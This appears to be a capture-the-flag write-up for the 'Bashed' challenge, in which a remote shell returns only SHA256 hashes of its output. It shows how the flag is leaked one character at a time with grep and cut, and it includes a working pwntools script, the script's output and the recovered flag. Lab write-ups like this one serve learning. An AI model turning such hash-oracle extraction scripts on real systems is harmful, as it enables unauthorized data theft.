# Bashed
Category: Miscellaneous

## Description
> My friend created an interactive shell and hid a flag on the machine, he says the shell is so protected that even the outputs are sha256 hashed so only people who know the files can view them, see if you can extract the flag

## Solution

Let's connect to the attached service:

```console
root@kali:/media/sf_CTFs/technion/Bashed# nc ctf.cs.technion.ac.il 4014
$ ls -al
[AWS_SECRET_REMOVED]90b545dc267437883161686d
```

We receive what looks like a SHA256 hash of the output. Let's verify it by comparing the output to an expected output such as "No such file or directory":

```console
root@kali:/media/sf_CTFs/technion/Bashed# cat no_such_file
cat: no_such_file: No such file or directory
root@kali:/media/sf_CTFs/technion/Bashed# cat no_such_file 2>&1 | sha256sum
[AWS_SECRET_REMOVED]223fb9cb889be28efac6233e  -
root@kali:/media/sf_CTFs/technion/Bashed# nc ctf.cs.technion.ac.il 4014
$ cat no_such_file
[AWS_SECRET_REMOVED]223fb9cb889be28efac6233e
```

This confirms our theory.

Let's assume that we have a command which would output the flag to the shell. Our problem is that we'll just get the SHA256 hash of the flag, which is not so useful. But what if we can get the shell to output just one letter from the flag? We can easily precalculate the SHA256 output for all printable characters and compare it to the output. This way, we'll be able to leak the flag character by character.

We'll use `grep -r -h` and `cut` for that, for example:
```console
root@kali:/media/sf_CTFs/technion/Bashed/1# grep -r cstechnion
fake.txt:cstechnion{fake_flag}
root@kali:/media/sf_CTFs/technion/Bashed/1# grep -h -r cstechnion
cstechnion{fake_flag}
root@kali:/media/sf_CTFs/technion/Bashed/1# grep -h -r cstechnion | cut -c 1
c
root@kali:/media/sf_CTFs/technion/Bashed/1# grep -h -r cstechnion | cut -c 2
s
```

Script:
```python
from pwn import *
import hashlib
import string
import itertools

r = remote("ctf.cs.technion.ac.il", 4014)

def get_command_sha256(command):
    r.sendlineafter("$ ", command)
    output = r.recvline()
    return output.decode("ascii").strip()

hash_dict = {}
for c in string.printable:
    digest = hashlib.sha256(f"{c}\n".encode("ascii")).hexdigest()
    hash_dict[digest] = c

flag = ""

for i in itertools.count(start = 1):
    hash = get_command_sha256(f"grep -h -r cstechnion |  cut -c {i}")
    character = hash_dict[hash]
    log.info(f"hash: {hash}, mapped to '{character}'")
    flag += character
    if character == "}":
        break

log.success("Flag: {}".format("".join(flag)))
```

Output:
```console
root@kali:/media/sf_CTFs/technion/Bashed# python3 solve.py
[+] Opening connection to ctf.cs.technion.ac.il on port 4014: Done
[*] hash: [AWS_SECRET_REMOVED]7b387244c2c909da779a1478, mapped to 'c'
[*] hash: [AWS_SECRET_REMOVED]4978bc9a1e74c5755f8ca556, mapped to 's'
[*] hash: [AWS_SECRET_REMOVED]4b4df7ce4b87db8b937b7703, mapped to 't'
[*] hash: [AWS_SECRET_REMOVED]7a0774fa41af0a4176992fd4, mapped to 'e'
[*] hash: [AWS_SECRET_REMOVED]7b387244c2c909da779a1478, mapped to 'c'
[*] hash: [AWS_SECRET_REMOVED]ad6bb1e4c1769e69c77ce0ca, mapped to 'h'
[*] hash: [AWS_SECRET_REMOVED]6a1ede54fabad829e01075c0, mapped to 'n'
[*] hash: [AWS_SECRET_REMOVED]777c88524ed3417509631625, mapped to 'i'
[*] hash: [AWS_SECRET_REMOVED]e2768111d9eb0edbfe59c704, mapped to 'o'
[*] hash: [AWS_SECRET_REMOVED]6a1ede54fabad829e01075c0, mapped to 'n'
[*] hash: [AWS_SECRET_REMOVED]c0631edbf786d6889a27a55c, mapped to '{'
[*] hash: [AWS_SECRET_REMOVED]ad6bb1e4c1769e69c77ce0ca, mapped to 'h'
[*] hash: [AWS_SECRET_REMOVED]967b89e81ab73b9972b72d1d, mapped to '4'
[*] hash: [AWS_SECRET_REMOVED]4978bc9a1e74c5755f8ca556, mapped to 's'
[*] hash: [AWS_SECRET_REMOVED]ad6bb1e4c1769e69c77ce0ca, mapped to 'h'
[*] hash: [AWS_SECRET_REMOVED]4588177470cecc4214b35284, mapped to '_'
[*] hash: [AWS_SECRET_REMOVED]6000f3c9ee954a27460dd865, mapped to '1'
[*] hash: [AWS_SECRET_REMOVED]4b4df7ce4b87db8b937b7703, mapped to 't'
[*] hash: [AWS_SECRET_REMOVED]4588177470cecc4214b35284, mapped to '_'
[*] hash: [AWS_SECRET_REMOVED]8be55d9bc94f6f3fe3ab86aa, mapped to '0'
[*] hash: [AWS_SECRET_REMOVED]c1864817652a8a39c55402cd, mapped to 'r'
[*] hash: [AWS_SECRET_REMOVED]4588177470cecc4214b35284, mapped to '_'
[*] hash: [AWS_SECRET_REMOVED]2d4de72986ea808f6e99813f, mapped to 'b'
[*] hash: [AWS_SECRET_REMOVED]e5e07bbd7a0fde60c4cf25c7, mapped to 'a'
[*] hash: [AWS_SECRET_REMOVED]5420892a7de62cd9ec582a06, mapped to '5'
[*] hash: [AWS_SECRET_REMOVED]ad6bb1e4c1769e69c77ce0ca, mapped to 'h'
[*] hash: [AWS_SECRET_REMOVED]4588177470cecc4214b35284, mapped to '_'
[*] hash: [AWS_SECRET_REMOVED]6000f3c9ee954a27460dd865, mapped to '1'
[*] hash: [AWS_SECRET_REMOVED]4b4df7ce4b87db8b937b7703, mapped to 't'
[*] hash: [AWS_SECRET_REMOVED]4251a7a54d202cf6101dd451, mapped to '}'
[+] Flag: cstechnion{h4sh_1t_0r_ba5h_1t}
```